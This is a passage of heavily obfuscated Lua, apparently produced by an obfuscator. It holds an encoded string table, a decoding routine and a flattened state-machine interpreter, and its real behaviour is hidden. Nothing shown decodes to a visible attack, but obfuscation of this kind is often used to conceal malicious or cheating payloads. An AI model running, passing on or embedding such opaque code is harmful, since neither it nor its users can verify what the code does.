5\051\050\078","\049\080\111\054\077\078\082\054\110\085\087\061";"\077\121\098\105\120\119\047\109\054\099\049\089\052\119\071\109";"\054\099\097\048\070\099\109\061";"\051\067\055\069\078\110\100\110\069\112\079\113\110\050\107\053\052\121\106\076\079\088\105\102";"\106\053\079\106\104\111\079\047\100\122\085\108\065\089\082\077\111\118\079\115\114\051\120\115\116\099\054\061";"\053\119\068\119\055\113\073\089\110\120\081\116\116\069\055\112\082\089\110\078\116\047\061\061","\100\067\054\061";"\051\070\121\084\051\119\109\061";"\075\077\047\049\100\104\066\061";"\114\085\077\117\051\077\121\105\117\121\111\100\068\114\061\061";"\054\072\111\083\049\099\101\103","\109\050\120\066","\077\117\048\052\052\085\110\121\120\088\052\087\108\076\054\115";"\054\072\052\103\070\088\049\071","\068\049\080\116\111\047\061\061","\082\080\082\087\098\069\069\107\110\065\105\089\065\047\061\061";"\049\072\071\083\049\114\061\061","\120\049\055\084\088\055\100\108";"\051\115\099\118\110\056\068\057\053\103\089\061";"\099\047\069\085\048\078\052\051\117\108\061\061";"\076\055\108\071\079\048\121\088\121\072\074\067\053\090\073\075\089\109\122\088\050\100\120\061","\078\055\119\053\105\086\051\054\104\112\080\061","\043\117\116\109\108\117\102\043\053\120\097\083\065\052\120\088";"\106\120\052\109\054\050\110\117\070\121\115\122\110\067\097\099\052\047\061\061";"\105\104\086\111\113\070\055\097\110\053\075\109\048\086\105\081\073\079\122\085\082\054\079\122\069\116\067\061","\109\057\102\113\097\069\087\077\072\081\101\106";"\077\072\078\107\080\071\051\067\108\067\097\067\121\057\108\075";"\120\066\047\109\108\067\071\106\097\066\103\109\098\053\054\078\077\109\061\061";"\112\087\082\116\101\049\097\051\088\085\121\076\115\115\048\081\049\054\073\051\078\047\104\089\047\074\069\075\102\088\100\052\121\050\105\075\065\050\115\079\076\100\107\086\104\099\097\085\051\101\054\061";"\068\105\088\087\047\069\117\108\078\052\052\120\080\114\061\061";"\106\047\048\113\065\114\061\061","\086\114\102\079\120\078\080\117\120\047\118\079\084\076\097\085\073\073\116\074\110\066\114\061","\119\073\053\067\117\108\061\061";"\068\066\078\101\065\043\084\075\110\055\043\049","\073\069\086\054","\080\107\087\090\107\065\117\112\104\107\109\061","\121\082\081\099\076\043\054\072\107\112\089\061","\070\053\113\098\085\114\061\061";"\122\055\068\110\069\108\069\054\111\100\122\121\071\110\080\120\080\114\061\061","\049\117\056\048\110\099\097\089","\103\070\115\090\090\074\079\061";"\121\111\102\106\054\050\108\109\121\119\098\080\082\071\097\086","\099\104\089\061","\070\099\052\083","\107\054\081\114\098\118\081\105\065\103\067\056\120\071\114\100\087\047\061\061","\103\073\052\048\049\102\117\119\066\122\054\113\119\051\072\109\110\101\109\118\087\047\072\104\085\111\108\047\107\090\115\087\043\088\102\086\075\100\049\122\115\085\066\090\104\057\109\072\098\076\117\078\083\112\076\049\075\052\107\087\047\079\072\104\114\078\112\118\112\081\085\047\083\117\043\081\079\105\118\084\103\070\082\112\119\069\068\087\053\073\072\085\078\120\111\065\084\083\098\055\071\047\061\061";"\056\075\114\103\081\055\053\055\056\054\106\069\113\050\106\073\056\099\056\052\078\111\081\043\072\068\113\105\077\055\117\109\113\053\111\101\054\084\077\109\100\103\080\054\111\043\071\089\066\050\076\061","\104\069\106\054\118\067\119\052\097\100\109\119\076\065\108\066\086\114\102\088";"\110\099\111\113\070\099\120\061","\065\050\083\069\101\078\083\116\102\078\057\078\056\115\119\072\047\069\052\043\117\116\116\061";"\108\114\109\075\101\109\082\070\047\054\120\056\080\109\061\061","\079\055\089\081\105\048\090\117\100\068\053\054\047\087\088\100\081\108\049\065\097\119\072\067\105\047\061\061";"\103\078\115\049\074\110\055\070\069\082\072\082\115\090\120\086\089\101\052\067\100\122\118\115\057\103\087\061";"\103\090\118\116\097\079\108\076\108\052\101\067\089\119\057\117\075\084\113\105\081\068\119\075\087\107\117\056\071\086\082\098\099\087\068\107\113\105\105\107\051\087\089\057\085\102\087\086\070\049\067\068\057\066\083\067";"\057\120\084\106\107\089\103\065";"\050\083\117\048\083\075\090\050\104\102\055\067\105\077\106\104\066\054\116\071\118\113\100\112\085\090\057\090\090\050\122\050\055\052\111\047\049\077\056\056\049\078\104\100","\114\108\108\120\069\116\080\061";"\105\050\082\088\089\074\103\077\057\079\104\086\102\052\050\043\057\048\110\068\085\072\110\055\087\108\110\053";"\070\073\053\084\073\087\109\113","\098\074\066\101\107\118\050\078\043\108\061\061","\056\103\079\121\047\109\071\115","\070\121\111\067\077\114\061\061","\086\070\083\072\097\054\108\088\084\117\099\082\116\101\074\115\067\104\117\108";"\057\053\068\097\078\119\078\101";"\073\098\071\069\106\056\102\075\048\102\073\103\100\054\055\105\104\087\098\071\108\078\043\061","\114\048\120\102\076\114\061\061";"\101\073\076\067\070\115\051\103\050\055\048\088\115\056\112\083\084\114\061\061","\100\081\101\113\080\120\066\087\055\121\097\049\086\076\107\097\080\065\072\082\107\049\084\090\056\122\111\065\083\052\075\084\115\112\097\083\109\047\116\061";"\113\071\066\111\115\104\082\117\119\057\072\071\105\084\068\078\108\052\051\055\122\109\061\061","\104\114\061\061","\054\110\070\113\065\107\115\055\049\117\102\122\097\106\087\099\097\103\121\112\073\051\122\047\102\075\119\043\049\087\076\080\078\084\070\054\081\047\089\071\107\048\073\080\084\114\061\061";"\106\050\048\067\082\111\049\112\082\076\048\079\097\121\071\108\053\109\061\061";"\080\067\052\112\108\085\110\109\053\072\098\108\054\099\048\106","\088\104\086\083\099\074\047\078\054\104\098\097\118\110\103\114\104\097\105\121\113\083\070\118\118\079\043\052\075\101\116\069\049\109\079\055\052\121\056\101\073\078\073\102\065\078\106\116\111\083\066\061";"\108\117\101\087\070\088\090\075","\098\077\111\090\077\056\119\074";"\106\057\098\067\054\066\110\071\110\114\061\061","\100\098\057\070\050\106\104\086\054\122\069\088\109\108\083\054\102\118\112\071\108\100\099\120\071\109\083\098","\051\090\079\049\081\108\061\061","\077\066\109\107\057\054\087\068\105\090\081\105\100\070\118\078\114\103\052\072\104\084\100\049\055\108\061\061";"\085\068\076\087\114\118\097\122\090\119\108\112\054\076\076\088\076\114\061\061","\107\115\072\073\054\115\120\110\086\121\074\075\069\088\087\107\113\089\085\079\048\072\070\069\114\057\082\067\090\043\065\053\113\097\087\121\119\053\100\102\075\077\098\069\056\112\087\052\118\119\074\120\112\115\120\065\103\119\043\084\054\077\056\049\080\118\068\103\106\077\066\080\079\043\104\057\086\072\111\107\086\065\053\055\049\081\117\074\121\090\057\088\102\088\080\061";"\051\116\117\117\117\073\074\071";"\081\084\100\078\105\074\098\105\051\068\079\061";"\120\074\108\055\097\119\108\118\081\081\120\072","\111\122\048\056\114\104\065\121\055\047\061\061","\105\098\074\121\049\084\082\054\101\120\043\061";"\056\086\081\103\087\090\108\071\104\066\054\090\099\086\055\107\048\047\103\104\100\099\076\061","\113\089\086\086\080\075\051\079\102\109\115\074\117\085\072\081\116\081\082\112\119\076\055\102\104\118\055\067\049\118\071\118\103\105\109\117\112\072\066\054\103\057\049\080\099\104\065\090\076\102\107\067\112\117\078\052\075\114\061\061";"\110\117\101\122\077\088\097\109\080\121\097\071","\055\080\116\089\100\112\083\119\106\086\054\061","\100\056\101\087\049\121\079\061";"\053\076\115\072\049\052\048\073\121\072\051\051\080\067\097\113\110\109\061\061","\081\075\080\100\048\098\107\055\089\048\065\075\048\109\061\061";"\108\088\102\071\080\100\098\071\052\099\111\113";"\080\117\048\048\054\047\061\061";"\121\121\110\098\077\075\097\076\121\053\102\051\097\119\066\088\097\047\061\061","\117\051\110\084";"\121\119\102\100\043\072\052\079\120\067\052\115","\067\121\075\087\119\071\117\108\083\114\085\109\089\047\079\068\052\068\100\077\076\077\047\061";"\070\080\107\056\068\072\097\080","\054\057\102\051\070\119\108\061","\101\053\055\077\078\086\052\052";"\050\080\088\074\115\080\049\086\110\075\067\118\107\054\051\070\097\122\069\050\080\107\054\122\121\113\099\043\118\118\052\109","\065\102\072\071\089\069\054\061";"\073\085\108\076\087\047\061\061";"\049\117\111\103\049\108\061\061","\052\087\112\103\080\098\102\053\087\120\117\070\043\086\109\077\080\065\105\047","\110\057\071\109\049\121\101\072","\104\089\047\122\065\085\056\109\049\043\107\106\069\052\108\072\101\047\051\084\111\051\110\078\052\081\074\075\105\102\088\082\120\085\120\065\109\103\056\088\051\065\109\048\071\068\116\055\117\053\103\110\099\049\081\089\076\098\050\086\049\076\077\065\110\054\049\057\105\122\121\122\052\049\050\100\073\117\122\066\106\051\043\073\071\068\074\111\099\099\070\112\106\081\043\061","\054\103\108\122\112\098\100\108\049\076\105\083\057\082\073\105\083\099\073\049\107\074\051\103\107\051\054\100","\114\109\061\061","\049\088\097\056\080\047\061\061";"\053\066\103\080\043\079\118\084\079\105\067\061";"\054\080\098\090\084\071\100\122\071\055\082\080\102\052\050\081\105\047\061\061","\101\075\081\087\054\114\073\106","\053\072\101\067\077\121\049\078";"\066\112\101\097\069\048\048\107\054\104\109\061","\108\113\065\071\090\101\090\111\097\082\086\071\100\070\053\052\116\066\089\082\114\112\099\077","\106\085\105\104\075\049\075\118\067\049\065\054\072\119\099\057\087\114\061\061";"\122\082\122\068\115\119\109\077\070\114\076\043\097\109\061\061","\115\083\110\113";"\098\099\052\075\110\057\102\104\082\108\061\061","\108\088\102\071\080\100\098\071\108\119\052\067\110\099\101\083";"\106\071\097\086\053\076\052\083\080\117\101\076\049\108\061\061"}local function p(p)return C[p-(671622-629660)]end for p,m in ipairs({{-105374-(-105375);-804240+804558};{176994-176993,49007+-48704};{451595+-451291,928555-928237}})do while m[353431-353430]<m[459505-459503]do C[m[484674-484673]],C[m[681843+-681841]],m[409116+-409115],m[-45472-(-45474)]=C[m[-746707+746709]],C[m[73323-73322]],m[503889-503888]+(413322-413321),m[-989978+989980]-(-468124+468125)end end do local p=math.floor local m=string.char local d=string.sub local W=table.insert local X=type local n=C local T=string.len local o=table.concat local L={["\043"]=486734-486722,F=-661186-(-661213),["\054"]=4351-4323,t=-739365-(-739425),["\049"]=1003374+-1003349;E=567131-567121;["\051"]=-575079-(-575120);q=-987569+987603;N=22838+-22781,z=-939860+939910,a=-38911+38924;V=295764+-295749,O=-779621-(-779677),W=-117954+117998;R=649889+-649859,["\047"]=-276034+276066;c=-506149+506155,L=370514-370478;["\053"]=147520+-147501,P=-500903-(-500927);G=-666178-(-666215),["\055"]=-891959+892022;J=-220301-(-220363);S=-783204-(-783250);w=-940743-(-940782);I=132665-132664,H=486519-486481;["\048"]=-740661+740694;o=-1019530+1019535,C=-153949-(-154001),l=590368+-590352,u=-565672-(-565726),n=-683696-(-683725),d=-1024463-(-1024486),Z=-186803-(-186811);e=757412+-757351;U=-34075+34110,b=-992965+992982,s=239322-239273,g=641117+-641072,i=382434+-382391;X=-582531+582586,D=281429-281398;k=-998379+998437,Y=-553718-(-553758);y=-112128+112150,v=42406+-42364;f=163046+-163037;Q=714759-714700;A=252642-252628,r=-749986-(-749986),["\052"]=-601312+601333,p=846043-846041;["\057"]=-667395+667402;h=-939454+939501;["\050"]=-1018251+1018254;m=-904498-(-904546),M=-910046+910072;j=-826597+826615,["\056"]=524279+-524226,T=835658+-835647;K=-1048227-(-1048278),B=-329841-(-329845);x=747960-747940}for C=-164862+164863,#n,211893+-211892 do local Q=n[C]if X(Q)=="\115\116\114\105\110\103"then local X=T(Q)local v={}local q=-721724+721725 local N=870919-870919 local l=-645457-(-645457)while q<=X do local C=d(Q,q,q)local n=L[C]if n then N=N+n*(-809314-(-809378))^((555467-555464)-l)l=l+(392266+-392265)if l==-643402+643406 then l=831738+-831738 local C=p(N/(46602-(-18934)))local d=p((N%(525169-459633))/(183701-183445))local X=N%(395154+-394898)W(v,m(C,d,X))N=-783416-(-783416)end elseif C=="\061"then W(v,m(p(N/(299432+-233896))))if q>=X or d(Q,q+(736793-736792),q+(446577+-446576))~="\061"then W(v,m(p((N%(799444+-733908))/(-681463-(-681719)))))end break end q=q+(-487989-(-487990))end n[C]=o(v)end end end return(function(C,d,W,X,n,T,o,J,q,L,N,z,Q,I,y,g,V,m,v,s,Z,F,l)m,z,L,N,V,Q,v,g,l,J,F,Z,y,I,s,q=function(m,W,X,n)local E,l,y,o,r,mK,a,i,LK,TK,zK,Q,Y,qK,K,R,k,S,U,u,QK,w,NK,e,H,f,nK,pK,lK,oK,x,IK,G,yK,dK,P,CK,h,XK,vK,N,B,j,A,b,c,D,M,WK,O,t,q while m do if m<7658112-(-332669)then if m<-409785+4991458 then if m<1813830-(-1038621)then if m<-503473+1624942 then if m<865153+-261306 then if m<215769+13696 then if m<377784-346546 then if m<-59766-(-77339)then L[X[857962+-857957]]=o Q=nil m=3014778-229870 else N=-389376-(-389509)q=L[X[386782+-386780]]Q=q*N q=29645059537684-345385 o=Q+q q=945486-945485 Q=35184372562538-473706 m=o%Q L[X[-800911+800913]]=m m=8062005-127669 Q=L[X[-998944-(-998947)]]o=Q~=q end else K=#Y B=832717-832717 j=K==B m=j and-616837+14543325 or 4085784-(-726226)end else if m<872400+-372022 then if m<-61241+441551 then m=6929431-(-1040290)x=nil y=nil else o=p(-442405-(-484495))m=C[o]Q=p(158175-116112)o=C[Q]Q=p(-849675+891738)C[Q]=m Q=p(295005+-252915)m=15363183-619904 C[Q]=o Q=L[X[323219-323218]]q=Q()end else m=14137626-(-251040)end end else if m<1298086-297946 then if m<-350343+1151536 then if m<902651+-236038 then E,H=A(k,E)m=E and 956674+14320784 or 8722861-635056 else y=65065+-65063 l=-551739-(-551740)q=L[X[931656-931655]]N=q(l,y)q=-787040-(-787041)Q=N==q o=Q m=Q and 11703679-450019 or 814885+7450560 end else Y=L[X[756318+-756317]]a=p(-430244+472423)b=429697+27565024404386 j=L[X[-134659-(-134661)]]K=j(a,b)u=Y[K]K=p(642312-600337)m=t[u]K=m[K]K={K(m)}Y=K[356954+-356952]m=-951115+16252898 j=K[589924-589921]u=K[-285571+285572]end else if m<887256-(-218863)then if m<1808804-724180 then m=true m=9743496-181400 else Y=p(574070+-531869)M=p(563163+-520974)y=q r=C[M]G=L[X[730756+-730753]]j=15277671379356-(-420398)t=L[X[-194413-(-194417)]]u=t(Y,j)K=18711155038387-112298 M=G[u]m=7702464-65607 c=r[M]t=L[X[948853+-948850]]u=L[X[987314+-987310]]j=p(54646+-12639)Y=u(j,K)G=t[Y]M=x[G]r=c(Q,M)x=nil y=nil end else r=p(-789771-(-831914))M=F(4132978-317165,{})o=p(-381844-(-423960))m=C[o]Q=L[X[-480740+480744]]l=p(-236457+278423)N=C[l]c=C[r]r={c(M)}x={d(r)}c=-531450-(-531452)y=x[c]l=N(y)N=p(518220+-476121)q=Q(l,N)Q={q()}o=m(d(Q))q=L[X[563289-563284]]Q=o o=q m=q and-168920+4203372 or 47839-42667 end end end else if m<-388227+2776116 then if m<1243948-(-352085)then if m<1506796-47529 then if m<735315+505554 then Q=W[1036061+-1036060]m=Q and 2251024-841609 or 2977105-(-874489)else o=p(830117+-787970)m=C[o]y=p(-787950-(-829918))q=L[X[-368214-(-368215)]]N=L[X[919852-919850]]x=17577675468532-(-569605)l=N(y,x)o=q[l]q=true m[o]=q m=14247829-345704 end else Q=W[771785+-771784]o=p(217161+-175014)y=p(-661339-(-703367))m=C[o]c=p(-595389-(-637512))q=L[X[476271+-476270]]N=L[X[-384406-(-384408)]]x=17825949698533-469369 l=N(y,x)r=23849357326979-(-930014)o=q[l]l=L[X[-458412-(-458413)]]y=L[X[-1017312+1017314]]x=y(c,r)N=l[x]q=Q[N]m[o]=q m=C[p(819023-777017)]Q=nil o={}end else if m<2656815-365298 then if m<-289622+2380419 then N=N+y q=N<=l c=not x q=c and q c=N>=l c=x and c q=c or q c=3445603-(-963280)m=q and c q=-926718+15970383 m=m or q else u=L[X[-553207-(-553208)]]K=p(728209+-685949)Y=L[X[-443525-(-443527)]]a=-26967+14740527612967 j=Y(K,a)t=u[j]m=G[t]j=p(-693425+735400)j=m[j]j={j(m)}m=12173328-845861 Y=j[939920-939917]u=j[59679-59677]t=j[-339213+339214]end else o=p(332324-290082)N=p(411928-369781)m=C[o]q=C[N]r=-877486+8937473717231 l=L[X[-838806-(-838807)]]y=L[X[-392830-(-392832)]]c=p(-404268-(-446496))x=y(c,r)N=l[x]Q=q[N]x=733380+7678246526259 o=m(Q)Q=p(-361227-(-403374))o=C[Q]q=L[X[899681+-899680]]N=L[X[865341+-865339]]y=p(361973-319847)l=N(y,x)Q=q[l]m=o[Q]m=m and 626031+12007056 or-33567+3324029 end end else if m<1612868-(-1041431)then if m<-31058+2593086 then if m<443757+2038235 then m=Q o={}L[X[-705796-(-705800)]]=m m=C[p(-37229+79382)]y=L[X[-872760-(-872765)]]x=L[X[558756-558752]]l=y[x]x=L[X[-39485+39486]]M=p(679757-637495)G=17326038539204-1031232 t=-736139+6307953362692 c=L[X[843703-843701]]r=c(M,G)y=x[r]N=l[y]G=p(-356193-(-398290))L[X[533796+-533790]]=N x=L[X[-914846+914851]]c=L[X[-582738-(-582742)]]y=x[c]c=L[X[-796627+796628]]r=L[X[570228-570226]]M=r(G,t)x=c[M]t=535182920158-(-997147)l=y[x]x=p(-754616+796763)L[X[649603-649596]]=l y=C[x]c=L[X[874773-874772]]r=L[X[483057-483055]]G=p(990919-948729)M=r(G,t)x=c[M]c=L[X[794943+-794939]]y[x]=c x=p(-109213+151455)y=C[x]c=L[X[580235-580231]]x=y(c,Q)Q=nil else Q=p(695145-653009)m={}L[X[-503676+503677]]=m o=C[Q]l=L[X[548412-548410]]m=642968+12104509 y={o(l)}q=y[-738621+738623]Q=y[-329587-(-329588)]N=y[642908+-642905]end else N=p(587710+-545604)o={}q=L[X[70626-70621]]N=q[N]N=N(q,Q)m=C[p(946830+-904818)]Q=nil end else if m<523191+2282293 then m=L[X[-445812-(-445819)]]m=m and-256203+9199186 or 25796+11231261 else H=p(562780+-520714)B=p(1067460-1025213)K=C[B]m=4787797-49720 D=-1008112+13553165892247 E=L[l]A=L[q]B=p(29806+12190)O=A(H,D)D=-596152+28828530707752 P=E[O]B=K[B]H=p(901371+-859295)B=B(K,P)P=p(33538+8609)K=C[P]E=L[l]A=L[q]O=A(H,D)P=E[O]E=true K[P]=E H=p(753943-711868)D=3939936544431-548741 E=L[l]A=L[q]O=A(H,D)P=E[O]E=I(1264963-(-248785),{l,q})K=B[P]B=nil P=p(549974-507947)P=K[P]P=P(K,E)end end end end else if m<4218126-261230 then if m<-515490+3937656 then if m<-598534+3862710 then if m<2592408-(-480270)then if m<2493721-(-367901)then P=v()L[P]=a k=p(-156317-(-198519))E=34253+-34153 o=C[k]k=p(-112938+155089)S=879712-869712 m=o[k]k=-771052-(-771053)o=m(k,E)A=357340-357085 H=1013078-1013077 k=v()h=-531687+531687 E=-307317-(-307317)L[k]=o w=p(602299+-560333)m=L[c]o=m(E,A)E=v()A=-420124+420125 L[E]=o m=L[c]O=L[k]o=m(A,O)A=v()L[A]=o D=145500+-145498 o=L[c]O=o(H,D)o=-105791-(-105792)m=O==o o=p(-650077+692176)D=p(702047+-659773)O=v()L[O]=m f=C[w]i=L[c]m=p(842026+-799773)U={i(h,S)}w=f(d(U))f=p(-934110+976384)m=j[m]R=w..f H=D..R m=m(j,o,H)D=p(-101259+143402)H=v()L[H]=m R=I(194511-(-491942),{c;P;G;N;q,K,O;H;k;A;E;M})o=C[D]D={o(R)}m={d(D)}D=m m=L[O]m=m and 3565390-(-980263)or 758447+7565186 else N=p(-2493+44599)q=L[X[1010460-1010456]]N=q[N]m=C[p(313205-270968)]N=N(q,Q)Q=nil o={}end else o=p(1048551+-1006309)l=p(-565426+607691)m=C[o]Q=L[X[64986-64985]]N=L[X[190562-190560]]l=Q[l]q={l(Q,N)}o=m(d(q))o={}m=C[p(-501629+543793)]end else if m<3548454-144581 then if m<2493065-(-874236)then o={}m=C[p(-756443+798467)]else m=L[X[-528301+528302]]o=L[X[1026509+-1026507]]Q=nil m[o]=Q m={}Q=m q=nil o=nil l=o m=L[X[-622845-(-622846)]]N=m m=7099701-(-537156)end else m=-818292+15561571 end end else if m<-984145+4804050 then if m<-927117+4735221 then if m<4362435-659983 then Y=p(-1021972+1064251)j=34603746704340-228579 M=p(-537268+579457)r=C[M]G=L[X[-844690+844692]]y=q K=-955142+4692865227663 t=L[X[-57410-(-57413)]]u=t(Y,j)M=G[u]m=16112756-(-554281)c=r[M]t=L[X[-654988-(-654990)]]y=nil j=p(-614275+656451)u=L[X[-849058-(-849061)]]Y=u(j,K)G=t[Y]M=x[G]x=nil r=c(Q,M)else r,G=x(c,r)m=r and 194873+3628885 or 722326+5254902 end else q=p(860504-818384)o=-1045865+8835948 N=413359+691021 Q=q^N m=o-Q Q=m o=p(-906605-(-948623))m=o/Q o={m}m=C[p(531073+-488891)]end else if m<4719893-894520 then M=r Y=L[X[977815-977814]]b=26446402008382-(-178909)j=L[X[807494-807492]]a=p(-814880-(-857087))K=j(a,b)t=p(31867+10212)t=G[t]u=Y[K]t=t(G,u)m=not t m=m and-343832+12255395 or 1324657-(-903619)else N=p(633502+-591355)q=C[N]r=15998450317985-(-172664)c=p(540892-498914)l=L[X[-7723-(-7724)]]m=415880+10288258 y=L[X[547946+-547944]]x=y(c,r)N=l[x]l=false q[N]=l end end end else if m<3366925-(-1005513)then if m<4689227-474700 then if m<-124389+4268235 then if m<341078+3703423 then N=L[X[-972262-(-972268)]]q=N==Q o=q m=-891004+896176 else m=493831+9691917 L[q]=o end else m=C[p(-962902+1005170)]o={}end else if m<4270886-(-56132)then if m<-730040+4952753 then l=v()q=v()N=p(-337891-(-380018))m=true y=v()c=p(-791899+834042)Q=W L[q]=m o=C[N]r=F(14120120-(-984690),{y})N=p(668053-625873)m=o[N]N=v()L[N]=m m=I(10121432-(-778766),{})L[l]=m m=false L[y]=m x=C[c]c=x(r)m=c and-29735+11498533 or-564051+4824507 o=c else c=p(1083602-1041400)x=o o=C[c]r=p(-121959-(-164148))c=p(954581-912430)m=o[c]c=v()L[c]=m o=C[r]r=p(-507045-(-549035))u=p(821084-778895)m=o[r]r=m G=m t=C[u]M=t m=t and 740299+3831833 or 204098+6565685 end else M,t=c(r,M)m=M and 7544550-435562 or 6178595-608773 end end else if m<3712921-(-805672)then if m<4993600-554217 then if m<5247777-852931 then m=-364152+4092186 M=nil G=nil else M=573725-573470 r=-1001411+1001411 m=L[X[-489530-(-489531)]]q=N c=m(r,M)Q[q]=c m=1637918-(-300805)q=nil end else m=p(296618-254355)m=e[m]m=m(e)m=-232100+11699647 end else if m<5501266-947604 then R=L[q]m=R and 11440806-56657 or 3583211-(-526671)o=R else Y=p(-761721-(-803910))u=C[Y]Y=p(698624+-656533)m=7575144-805361 t=u[Y]M=t end end end end end else if m<1000936+5098547 then if m<372207+4953975 then if m<113622+4802092 then if m<-893626+5647972 then if m<4033828-(-649180)then if m<4558541-(-52475)then Q=p(-665336+707340)o=C[Q]G=611462+22357192086564 M=p(947144-905034)N=L[X[-938112-(-938113)]]x=L[X[-1012505-(-1012507)]]c=L[X[-378253-(-378256)]]r=c(M,G)y=x[r]c=L[X[-1001685+1001689]]r=L[X[1019630+-1019625]]x=c..r l=y..x q=N..l Q=o(q)m=not Q m=m and-186548+7898468 or 769487+4996098 else N=p(582308+-540059)q=C[N]l=L[X[69957-69954]]N=q(l)c=p(323307+-281062)l=L[X[-916450+916451]]y=L[X[263159+-263157]]r=23360050837565-19904 x=y(c,r)q=l[x]m=N==q m=m and 499475+6422608 or 5321451-350989 end else K=I(-240513+7590756,{l,q})pK=-65848+32066603760524 P=p(-175613-(-217706))i=p(-997107-(-1039293))B=C[P]U=-949409+5563911784127 h=26532358944969-346246 A=p(-532518+574765)E=C[A]H=L[l]dK=277278+16375140836011 D=L[q]w=D(i,U)O=H[w]i=p(218590-176519)CK=-480916+10072811170022 H=p(-514567-(-556784))H=E[H]A={H(E,O)}XK=6762371917479-(-26021)P=B(d(A))oK=p(-337569-(-379761))QK=p(397322-355122)B=P()mK=739339+28249669479255 P=v()L[P]=B B=L[P]U=-225448+1587664892811 H=L[l]D=L[q]w=D(i,U)WK=346023+15551108486306 S=-84758+24759983831071 O=H[w]U=p(-607814+649862)D=L[l]w=L[q]i=w(U,h)nK=p(-260550-(-302631))H=D[i]h=p(-584082-(-626121))w=L[l]yK=815266+422610653218 i=L[q]U=i(h,S)S=p(752525-710393)LK=-809240+27456354765577 D=w[U]zK=-660502+32691323047821 TK=10835827960056-(-240317)i=L[l]U=L[q]h=U(S,CK)CK=p(198764-156576)w=i[h]U=L[l]h=L[q]S=h(CK,pK)pK=p(737619+-695567)i=U[S]qK=p(806858-764624)h=L[l]S=L[q]vK=-877542+9268391081153 IK=31998881403392-(-1026100)CK=S(pK,mK)U=h[CK]S=L[l]CK=L[q]mK=p(820911-778875)pK=CK(mK,dK)h=S[pK]dK=p(-516172+558192)CK=L[l]pK=L[q]mK=pK(dK,WK)WK=p(-291121-(-333114))S=CK[mK]pK=L[l]mK=L[q]dK=mK(WK,XK)CK=pK[dK]pK=false dK=L[l]WK=L[q]XK=WK(nK,TK)mK=dK[XK]dK=false XK=L[l]nK=L[q]NK=31157003871408-(-644092)TK=nK(oK,LK)WK=XK[TK]TK=L[l]oK=L[q]LK=oK(QK,vK)nK=TK[LK]TK=false LK=L[l]QK=L[q]vK=QK(qK,NK)lK=p(573819-531592)oK=LK[vK]vK=L[l]qK=L[q]LK=nil NK=qK(lK,zK)zK=p(880616-838630)QK=vK[NK]qK=L[l]NK=L[q]lK=NK(zK,yK)vK=qK[lK]XK={[nK]=TK,[oK]=LK,[QK]=vK}QK=p(612494-570359)vK=3144529559212-(-280332)yK=12693574841097-449523 TK=L[l]oK=L[q]lK=p(148099+-106115)qK=p(313969-271860)E=p(197643-155366)LK=oK(QK,vK)zK=3362785477330-441525 nK=TK[LK]LK=L[l]NK=-722679+11466261912530 QK=L[q]vK=QK(qK,NK)oK=LK[vK]LK=false vK=L[l]qK=L[q]NK=qK(lK,zK)E=B[E]QK=vK[NK]qK=L[l]NK=L[q]zK=p(117065+-74952)lK=NK(zK,yK)yK=p(294575+-252320)vK=qK[lK]NK=L[l]lK=L[q]zK=lK(yK,IK)qK=NK[zK]NK=true TK={[oK]=LK;[QK]=vK;[qK]=NK}LK=L[l]qK=p(-258790-(-300928))NK=285032+23065904484492 QK=L[q]vK=QK(qK,NK)QK=-3670+34502803180824 oK=LK[vK]LK=false vK=p(-78646-(-120661))A={[O]=H;[D]=w;[i]=U,[h]=S,[CK]=pK;[mK]=dK,[WK]=XK;[nK]=TK,[oK]=LK}S=-583703+19260647361311 E=E(B,A)B=v()XK=p(536388-494389)CK=21130840137999-866976 A=V(8076375-390655,{P,l;q})L[B]=A pK=8054851529413-154655 A=L[B]D=L[l]w=L[q]U=p(-941450-(-983439))h=61212+30120455948205 i=w(U,h)H=D[i]qK=25300346996024-(-174285)h=p(-573853-(-615879))w=L[l]i=L[q]U=i(h,S)D=w[U]w=-897596-(-897601)U=15566927753076-(-683228)O=A(H,D,w)H=L[l]i=p(-1047810+1090031)h=-195230+6467186902625 zK=585133+3097322084341 A=p(79758-37523)D=L[q]A=E[A]w=D(i,U)O=H[w]S=21519020892716-654088 U=p(-708703-(-750934))mK=18127662102746-38881 H=4482742912-(-619546)LK=p(50507-8478)nK=-612015+9749238933610 A=A(E,O,H)D=L[l]w=L[q]i=w(U,h)h=p(589312-547160)H=D[i]D=4482371643-(-990815)O=p(774622-732387)O=E[O]O=O(E,H,D)w=L[l]i=L[q]U=i(h,S)H=p(310182-267947)H=E[H]D=w[U]w=4482755538-(-606920)H=H(E,D,w)w=p(-151530-(-193677))S=p(-809390-(-851551))D=C[w]i=L[l]U=L[q]h=U(S,CK)w=i[h]CK=p(979169-937054)U=L[l]h=L[q]S=h(CK,pK)CK=p(-167639+209847)i=U[S]D[w]=i D=p(-489001+530977)U=L[l]h=L[q]pK=-131018+12867006863153 S=h(CK,pK)i=U[S]U=L[y]CK=p(660298+-618140)D=A[D]pK=-473817+10706451385938 w=i..U U=L[l]h=L[q]S=h(CK,pK)i=U[S]pK=p(1020754-978476)D=D(A,w,i)w=v()L[w]=D h=L[l]S=L[q]CK=S(pK,mK)pK=p(1082461-1040314)U=h[CK]CK=C[pK]mK=L[l]dK=L[q]WK=dK(XK,nK)pK=mK[WK]S=CK[pK]mK=L[l]nK=-450084+3771749475584 XK=p(534762-492650)dK=L[q]WK=dK(XK,nK)pK=mK[WK]dK=L[Y]nK=L[l]TK=L[q]oK=TK(LK,QK)XK=nK[oK]oK=L[l]LK=L[q]QK=LK(vK,qK)TK=oK[QK]oK=L[j]NK=6076042372428-629311 nK=TK..oK WK=XK..nK D=p(498264-456288)mK=dK..WK CK=pK..mK D=O[D]XK=19802510859975-(-312638)pK=p(-841237-(-883460))h=S..CK mK=316932+10534120652069 i=U..h QK=p(-855050-(-897029))WK=-58111+17572329079541 h=L[l]dK=876310+10154258396002 S=L[q]CK=S(pK,mK)U=h[CK]D=D(O,i,U)S=L[l]CK=L[q]oK=15079278789487-(-514046)mK=p(-975259+1017292)pK=CK(mK,dK)nK=p(-689313+731360)i=p(-419269-(-461277))LK=-64603+20225122722085 h=S[pK]CK=L[l]dK=p(548063-505812)pK=L[q]mK=pK(dK,WK)TK=1028193+6126890654404 S=CK[mK]WK=p(756368-714363)pK=L[l]vK=9271421015693-(-506448)mK=L[q]dK=mK(WK,XK)CK=pK[dK]pK=L[M]dK=L[l]WK=L[q]XK=WK(nK,TK)mK=dK[XK]WK=L[l]XK=L[q]TK=p(-904680-(-946918))nK=XK(TK,oK)dK=WK[nK]oK=p(-484230+526244)i=A[i]XK=L[l]nK=L[q]TK=nK(oK,LK)WK=XK[TK]TK=L[l]XK=false 